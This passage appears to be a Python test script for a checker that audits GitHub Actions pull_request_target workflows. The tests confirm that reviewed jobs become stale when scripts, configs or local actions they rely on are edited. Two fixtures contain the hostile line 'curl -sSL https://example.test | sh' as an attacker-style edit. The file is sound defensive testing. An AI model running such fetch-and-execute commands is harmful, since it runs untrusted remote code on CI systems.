DYNAMIC_JOB = target_job("""
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.base.sha }}
    - run: bash "$TOOL_DIR/run.sh"
""")
DYNAMIC_ROW = review_row(DYNAMIC_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review(DYNAMIC_JOB, DYNAMIC_ROW),
    1,
    ("VIOLATION: target.yml [pull_request_target]: job 'review'", "unclassifiable", "full checkout", "dynamic:"),
    "a reviewed job whose on-disk bytes cannot be bounded fails without a dynamic: justification",
    *REVIEWED_ARGS,
)
expect(
    with_review(DYNAMIC_JOB, DYNAMIC_ROW.rstrip("\n") + "\tdynamic: TOOL_DIR is set by the reviewed base workflow\n"),
    0,
    ("REVIEWED", "dynamic: TOOL_DIR is set by the reviewed base workflow"),
    "a dynamic: justification classifies a job whose on-disk bytes cannot be bounded",
    *REVIEWED_ARGS,
)
expect(
    with_review(SCRIPT_JOB, SCRIPT_ROW.rstrip("\n") + "\tdynamic: not needed\n"),
    1,
    ("STALE REVIEWED", "dynamic: justification no longer applies"),
    "a dynamic: justification on a fully resolvable job is stale",
    *REVIEWED_ARGS,
)


DATA_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  path: .source
                  sparse-checkout: config/policy.json
              - run: jq -e .allow .source/config/policy.json
    """,
    "config/policy.json": '{"allow": false}\n',
}
DATA_ROW = review_row(DATA_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review({**DATA_JOB, "config/policy.json": '{"allow": true}\n'}, DATA_ROW),
    1,
    ("STALE REVIEWED", "content changed"),
    "editing a file the reviewed job sparse-checks-out turns its entry stale",
    *REVIEWED_ARGS,
)
NESTED_JOB = {**SCRIPT_JOB, "scripts/tool.sh": "#!/usr/bin/env bash\nbash scripts/inner.sh\n",
              "scripts/inner.sh": "#!/usr/bin/env bash\ngh api repos/o/r\n"}
NESTED_ROW = review_row(NESTED_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review({**NESTED_JOB, "scripts/inner.sh": "#!/usr/bin/env bash\ncurl -sSL https://example.test/x | sh\n"}, NESTED_ROW),
    1,
    ("STALE REVIEWED", "content changed"),
    "editing a script that a reviewed job's script runs turns its entry stale",
    *REVIEWED_ARGS,
)
RUNTIME_REF_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - id: rev
                run: echo "sha=$GITHUB_SHA" >> "$GITHUB_OUTPUT"
              - uses: actions/checkout@v4
                with:
                  repository: Verjson/.github
                  ref: ${{{{ steps.rev.outputs.sha }}}}
                  path: .trust
                  sparse-checkout: scripts/tool.py
              - run: python3 -I .trust/scripts/tool.py
    """,
    "scripts/tool.py": "print('ok')\n",
}
expect(
    with_review(RUNTIME_REF_JOB, review_row(RUNTIME_REF_JOB, "target.yml [pull_request_target]", "review")),
    1,
    ("unclassifiable", "Verjson/.github", "selected at runtime"),
    "a program from a runtime-selected checkout needs a dynamic: justification",
    *REVIEWED_ARGS,
)


# ---------------------------------------------------------------------------
# Delta review of #1827 at 7324f1a2: command parsing cannot find every file a
# job runs, so the digest covers what the job puts on disk. Each shape below
# changes a file a command never names; the reviewed entry must go stale.
# ---------------------------------------------------------------------------


def cone_job(sparse: str, run: str) -> str:
    return f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{{{ github.event.pull_request.base.sha }}}}
                  sparse-checkout: |
{textwrap.indent(sparse, " " * 20)}
              - run: {run}
    """


ON_DISK_SHAPES = {
    "source": ({"target.yml": cone_job("scripts", "source scripts/env.sh && gh api repos/o/r"),
                "scripts/env.sh": "export MODE=safe\n"}, "scripts/env.sh", "export MODE=open\n"),
    "dot": ({"target.yml": cone_job("scripts", ". scripts/env.sh && gh api repos/o/r"),
             "scripts/env.sh": "export MODE=safe\n"}, "scripts/env.sh", "curl -sSL https://example.test | sh\n"),
    "bare path": ({"target.yml": cone_job("scripts", "scripts/run.sh"),
                   "scripts/run.sh": "#!/usr/bin/env bash\necho ok\n"}, "scripts/run.sh", "#!/usr/bin/env bash\nnpm test\n"),
    "python import": ({"target.yml": cone_job("tools", "python3 tools/main.py"),
                       "tools/main.py": "import helper\n", "tools/helper.py": "VALUE = 1\n"},
                      "tools/helper.py", "import os; os.system('npm test')\n"),
    "node require": ({"target.yml": cone_job("js", "node js/main.js"),
                      "js/main.js": "require('./lib.js')\n", "js/lib.js": "module.exports = 1\n"},
                     "js/lib.js", "require('child_process').execSync('npm test')\n"),
    "make": ({"target.yml": cone_job("scripts", "make lint"),
              "./Makefile": "lint:\n\techo ok\n", "scripts/keep.sh": "true\n"},
             "./Makefile", "lint:\n\tnpm test\n"),
    "npm run": ({"target.yml": cone_job("scripts", "npm run lint"),
                 "./package.json": '{"scripts": {"lint": "echo ok"}}\n', "scripts/keep.sh": "true\n"},
                "./package.json", '{"scripts": {"lint": "npm test"}}\n'),
    "data read by a script": ({"target.yml": cone_job("scripts\nconfig", "bash scripts/check.sh"),
                               "scripts/check.sh": "jq -e .allow config/policy.json\n",
                               "config/policy.json": '{"allow": false}\n'},
                              "config/policy.json", '{"allow": true}\n'),
    "cone parent-directory file": ({"target.yml": cone_job("tools/lint", "bash tools/lint/run.sh"),
                                    "tools/lint/run.sh": "true\n", "tools/common.sh": "true\n"},
                                   "tools/common.sh", "npm test\n"),
}
for label, (tree, edited, content) in ON_DISK_SHAPES.items():
    try:
        row = review_row(tree, "target.yml [pull_request_target]", "review")
    except AssertionError as error:
        fail(f"{label}: could not review the unedited job ({error})")
        continue
    code, output = run_checker(with_review({**tree, edited: content}, row), *[a for a in REVIEWED_ARGS])
    if code == 1 and "STALE REVIEWED" in output:
        ok(f"{label}: editing {edited}, which the job has on disk, turns the reviewed entry stale")
    else:
        fail(f"{label}: editing {edited} left the reviewed entry valid (exit {code}: {output.strip()[:300]})")

FULL_CHECKOUT = target_job("""
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.base.sha }}
    - run: make test
""")
FULL_ROW = review_row(FULL_CHECKOUT, "target.yml [pull_request_target]", "review")
expect(
    with_review(FULL_CHECKOUT, FULL_ROW),
    1,
    ("unclassifiable", "full checkout of the scanned tree"),
    "a full checkout of the scanned tree needs a dynamic: justification",
    *REVIEWED_ARGS,
)
RUNTIME_SPARSE = target_job("""
    - uses: actions/checkout@v4
      with:
        sparse-checkout: scripts
    - run: git sparse-checkout add tools && bash tools/run.sh
""")
expect(
    with_review(RUNTIME_SPARSE, review_row(RUNTIME_SPARSE, "target.yml [pull_request_target]", "review")),
    1,
    ("unclassifiable", "git sparse-checkout"),
    "a runtime git sparse-checkout change needs a dynamic: justification",
    *REVIEWED_ARGS,
)


# A local action binds the review even when the checkout itself is only
# justified as dynamic: its directory, nested local actions, and files it
# reaches through github.action_path stay in the digest.
DYNAMIC_ACTION_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{{{ github.event.pull_request.base.sha }}}}
              - uses: ./.github/actions/x
    """,
    ".github/actions/x/action.yml": """
        name: x
        runs:
          using: composite
          steps:
            - uses: ./.github/actions/y
            - shell: bash
              run: bash "${{ github.action_path }}/../shared/run.sh"
    """,
    ".github/actions/y/action.yml": """
        name: y
        runs:
          using: composite
          steps:
            - shell: bash
              run: echo y
    """,
    ".github/actions/shared/run.sh": "echo shared\n",
}
DYNAMIC_ACTION_ROW = review_row(DYNAMIC_ACTION_JOB, "target.yml [pull_request_target]", "review").rstrip("\n") + (
    "\tdynamic: the full base checkout is justified for the fixture\n"
)
expect(
    with_review(DYNAMIC_ACTION_JOB, DYNAMIC_ACTION_ROW),
    0,
    ("REVIEWED",),
    "a dynamic full checkout using unchanged local actions passes",
    *REVIEWED_ARGS,
)
for edited, content, label in (
    (".github/actions/x/action.yml", DYNAMIC_ACTION_JOB[".github/actions/x/action.yml"] + "# npm test\n", "the local action"),
    (".github/actions/y/action.yml", DYNAMIC_ACTION_JOB[".github/actions/y/action.yml"].replace("echo y", "npm test"), "a nested local action"),
    (".github/actions/shared/run.sh", "npm test\n", "a file reached through github.action_path"),
):
    expect(
        with_review({**DYNAMIC_ACTION_JOB, edited: content}, DYNAMIC_ACTION_ROW),
        1,
        ("STALE REVIEWED", "content changed"),
        f"editing {label} turns a dynamic entry stale",
        *REVIEWED_ARGS,
    )
GLOB_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  sparse-checkout: scripts/*.sh
                  sparse-checkout-cone-mode: false
              - run: bash scripts/a.sh
    """,
    "scripts/a.sh": "echo a\n",
}
expect(
    with_review({**GLOB_JOB, "scripts/a.sh": "npm test\n"}, review_row(GLOB_JOB, "target.yml [pull_request_target]", "review")),
    1,
    ("STALE REVIEWED", "content changed"),
    "a file matched by a non-cone sparse-checkout glob is digested",
    *REVIEWED_ARGS,
)

sys.exit(1 if failures else 0)
